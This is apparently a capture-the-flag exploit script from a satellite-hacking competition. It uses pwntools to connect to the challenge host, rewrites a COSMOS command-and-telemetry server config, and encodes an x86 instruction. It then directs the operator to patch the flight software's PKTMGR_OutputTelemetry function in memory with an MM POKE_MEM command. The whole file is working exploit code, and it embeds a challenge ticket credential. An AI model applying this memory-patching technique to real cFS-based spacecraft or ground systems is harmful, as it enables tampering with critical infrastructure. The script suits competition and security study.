from pwn import *

TICKET = 'ticket{yankee91091zulu:GPZ1OLLss1tz0ZPNx5s2H2jg3AdGygwCtQlM_ONOsx9Fkuy2Bs35EUcoAlupyEm26g}'

context(log_level='debug')
r = remote("bytes.satellitesabove.me", 5042)
r.recvuntil(":")
r.sendline(TICKET)

r.recvuntil("Forwarding Service on tcp:")
host,port = r.recvline().decode('utf8').strip().split(':')
print(host, port)

f = open("cosmos/config/tools/cmd_tlm_server/cmd_tlm_server.txt", "r")
s = f.read().splitlines()
f.close()
s[5] = f"INTERFACE LOCAL_CFS_INT tcpip_client_interface.rb {host} {port} {port} 10 nil"
f = open("cosmos/config/tools/cmd_tlm_server/cmd_tlm_server.txt", "w")
f.write('\n'.join(s))
f.close()

val = u32(asm('mov edx, DWORD PTR [ebp-0x55ec]')[:4])
log.info("now open up cosmos and send MM POKE_MEM with DATA_SIZE 32, DATA {}, ADDR_OFFSET 350, ADDR_SYMBOL_NAME 'PKTMGR_OutputTelemetry'".format(val))
log.info("then send KIT_TO ENABLE_TELEMETRY")

r.interactive()
